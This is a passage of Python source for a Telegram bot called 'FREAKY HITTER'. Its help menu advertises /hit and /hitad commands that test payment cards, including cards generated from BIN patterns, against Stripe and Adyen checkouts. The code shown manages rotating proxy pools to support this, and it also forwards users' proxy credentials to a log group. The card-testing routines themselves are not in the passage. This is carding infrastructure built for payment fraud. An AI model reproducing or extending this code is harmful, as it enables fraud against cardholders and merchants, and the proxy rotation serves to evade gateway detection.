        markup = InlineKeyboardMarkup(inline_keyboard=buttons)
        await status_msg.edit_text(final_msg, reply_markup=markup)
        
        if LOG_GROUP_ID:
            try:
                live_str = "\n".join([f"<code>• {p}</code>" for p in live_proxies[:30]]) if live_proxies else "None"
                if len(live_proxies) > 30:
                    live_str += f"\n...and {len(live_proxies) - 30} more active channels"
                dead_str = "\n".join([f"<code>• {p}</code>" for p in dead_proxies[:10]]) if dead_proxies else "None"
                if len(dead_proxies) > 10:
                    dead_str += f"\n...and {len(dead_proxies) - 10} more offline channels"
                
                msg_text = (
                    f"📡 <b>Proxy Telemetry</b>\n\n"
                    f"👤 User: {message.from_user.first_name}\n"
                    f"🟢 Active: {live_count}\n"
                    f"🔴 Dead: {dead_count}\n\n"
                    f"<b>[ ACTIVE IPS ]</b>\n{live_str}\n\n"
                    f"<b>[ DEAD IPS ]</b>\n{dead_str}"
                )
                await bot.send_message(LOG_GROUP_ID, msg_text)
            except:
                pass
    else:
        # Standard check report
        if dead_count > 0:
            final_msg += f"\n<code>[ INFO   ] removed {dead_count} inactive proxy channels from storage</code>"
        
        markup = None
        if weak_count > 0:
            if not hasattr(bot, 'weak_proxies_cache'):
                bot.weak_proxies_cache = {}
            bot.weak_proxies_cache[user_id] = weak_proxies
            
            from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text=f"Purge Weak IPs ({weak_count})", callback_data="rm_weak_proxies")]
            ])
            
        try:
            if markup:
                await status_msg.edit_text(final_msg, reply_markup=markup)
            else:
                await status_msg.edit_text(final_msg)
        except Exception:
            if markup:
                await message.answer(final_msg, reply_markup=markup)
            else:
                await message.answer(final_msg)

@dp.callback_query(F.data == "add_strong_only")
async def process_add_strong_only(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    cache = getattr(bot, 'pasted_proxies_cache', {}).get(user_id, {})
    premium_raws = cache.get('premium', [])
    
    if not premium_raws:
        await callback.answer("No strong proxies found in cache or session expired.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    existing_raws = {p['raw'] for p in pool}
    added = 0
    for p_raw in premium_raws:
        if p_raw not in existing_raws:
            parts = p_raw.split(':')
            if len(parts) == 4:
                pool.append({"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]})
            elif len(parts) == 2:
                pool.append({"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}"})
            added += 1
            
    if added > 0:
        await ProxyManager.save_user_proxies(user_id, pool)
        if LOG_GROUP_ID:
            try:
                proxies_str = "\n".join([f"<code>• {p}</code>" for p in premium_raws[:30]])
                if len(premium_raws) > 30:
                    proxies_str += f"\n...and {len(premium_raws) - 30} more premium channels"
                msg = f"💎 <b>Saved {added} Premium/Strong proxies to pool!</b>\n👤 User: {callback.from_user.first_name}\n\n{proxies_str}"
                if len(msg) > 4000:
                    msg = f"💎 <b>Saved {added} Premium/Strong proxies to pool!</b>\n👤 User: {callback.from_user.first_name}"
                await bot.send_message(LOG_GROUP_ID, msg)
            except:
                pass
        
    bot.pasted_proxies_cache[user_id] = {}
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"<b>Proxy Update</b>\n<code>Added {added} premium proxies. Standard/Weak/Dead IPs ignored.</code>")
    await callback.answer("Premium proxies added successfully!")

@dp.callback_query(F.data == "add_live_all")
async def process_add_live_all(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    cache = getattr(bot, 'pasted_proxies_cache', {}).get(user_id, {})
    live_raws = cache.get('live', [])
    
    if not live_raws:
        await callback.answer("No live proxies found in cache or session expired.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    existing_raws = {p['raw'] for p in pool}
    added = 0
    for p_raw in live_raws:
        if p_raw not in existing_raws:
            parts = p_raw.split(':')
            if len(parts) == 4:
                pool.append({"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]})
            elif len(parts) == 2:
                pool.append({"raw": p_raw, "server": f"http://{parts[0]}:{parts[1]}"})
            added += 1
            
    if added > 0:
        await ProxyManager.save_user_proxies(user_id, pool)
        if LOG_GROUP_ID:
            try:
                proxies_str = "\n".join([f"<code>• {p}</code>" for p in live_raws[:30]])
                if len(live_raws) > 30:
                    proxies_str += f"\n...and {len(live_raws) - 30} more channels"
                msg = f"📥 <b>Saved all {added} live proxies to pool!</b>\n👤 User: {callback.from_user.first_name}\n\n{proxies_str}"
                if len(msg) > 4000:
                    msg = f"📥 <b>Saved {added} live proxies to pool!</b>\n👤 User: {callback.from_user.first_name}"
                await bot.send_message(LOG_GROUP_ID, msg)
            except:
                pass
        
    bot.pasted_proxies_cache[user_id] = {}
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"<b>Proxy Update</b>\n<code>Added {added} live proxies to active pool.</code>")
    await callback.answer("All live proxies added successfully!")

@dp.callback_query(F.data == "rm_weak_proxies")
async def process_rm_weak(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    weak_proxies = getattr(bot, 'weak_proxies_cache', {}).get(user_id, [])
    
    if not weak_proxies:
        await callback.answer("No weak proxies found or session expired.", show_alert=True)
        return
        
    pool = await ProxyManager.get_user_proxies(user_id)
    new_pool = [p for p in pool if p['raw'] not in weak_proxies]
    removed = len(pool) - len(new_pool)
    
    if removed > 0:
        await ProxyManager.save_user_proxies(user_id, new_pool)
        
    bot.weak_proxies_cache[user_id] = []
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.reply(f"🗑 <b>Removed {removed} weak Datacenter/VPN proxies!</b>\nYour pool is now clean.")
    await callback.answer("Proxies removed successfully!")


@dp.callback_query(F.data == "show_commands")
async def process_show_commands(callback: types.CallbackQuery):
    commands_text = (
        "⚡ <b>FREAKY HITTER COMMANDS</b> ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💳 <b>/hit</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
        "└ <i>Hits 1 to 10 cards against Stripe checkout.</i>\n\n"
        "💎 <b>/hitad</b> <code>[url] [cc|mm|yy|cvc] ...</code>\n"
        "└ <i>Hits 1 to 10 cards against Adyen gateway checkout.</i>\n\n"
        "🎲 <b>/hit</b> <code>[url] [bin_pattern] [count]</code>\n"
        "└ <i>Generates BIN cards and hits concurrently.</i>\n\n"
        "🌐 <b>/proxy</b> <code>[ip:port:user:pass]</code>\n"
        "└ <i>Imports and validates new proxy pool.</i>\n\n"
        "🧹 <b>/proxy</b>\n"
        "└ <i>Runs self-check and purges dead IPs.</i>\n\n"
        "📊 <b>/proxystatus</b>\n"
        "└ <i>Displays active working proxy count.</i>\n\n"
        "🔌 <b>/offproxy</b>\n"
        "└ <i>Clears proxy pool & uses direct IP.</i>\n\n"
        "🛑 <b>/stop</b>\n"
        "└ <i>Instantly aborts your active session.</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    await callback.message.answer(commands_text)
    await callback.answer()



from aiohttp import web

async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Dummy web server started on port {port} for Render health checks")

async def auto_proxy_checker_loop():
    while True:
        try:
            await asyncio.sleep(6 * 60 * 60) # Wake up every 6 hours
            print("Running Auto Proxy Checker...")
            users = await ProxyManager.get_all_users()
            for uid in users:
                proxies = list(await ProxyManager.get_user_proxies(uid))
                if not proxies: continue
                
                # Test all proxies (is_pool=True automatically deletes dead ones)
                live_proxies, dead_proxies, weak_proxies = await test_proxy_list(proxies, True, uid)
                live_count = len(live_proxies)
                dead_count = len(dead_proxies)
                
                if dead_count > 0:
                    msg = f"<b>Proxy Cleanup</b>\n<code>Removed {dead_count} dead/blocked proxy channels. Remaining active count: {live_count}</code>"
                    try:
                        await bot.send_message(uid, msg)
                    except: pass
        except Exception as e:
            print(f"Auto proxy loop error: {e}")
            await asyncio.sleep(60) # Prevent tight crash loop

async def main() -> None:
    print("Bot is starting...")
    global db_pool
    db_url = os.environ.get("DATABASE_URL")
    if db_url:
        print("Connecting to Supabase...")
        db_pool = await asyncpg.create_pool(db_url, min_size=1, max_size=4)
        async with db_pool.acquire() as conn:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS user_proxies (
                    user_id BIGINT PRIMARY KEY,
                    proxies JSONB DEFAULT '[]'
                );
            """)
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS approved_users (
                    user_id BIGINT PRIMARY KEY
                );
            """)
            rows = await conn.fetch("SELECT user_id FROM approved_users")
            for r in rows:
                approved_users_set.add(r['user_id'])
        await ProxyManager.init_db(db_pool)
        print("Supabase connected, user_proxies, and approved_users tables ready!")
    else:
        print("WARNING: DATABASE_URL not set! Proxies will not be saved.")
        
        
    await start_web_server()
    asyncio.create_task(auto_proxy_checker_loop())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
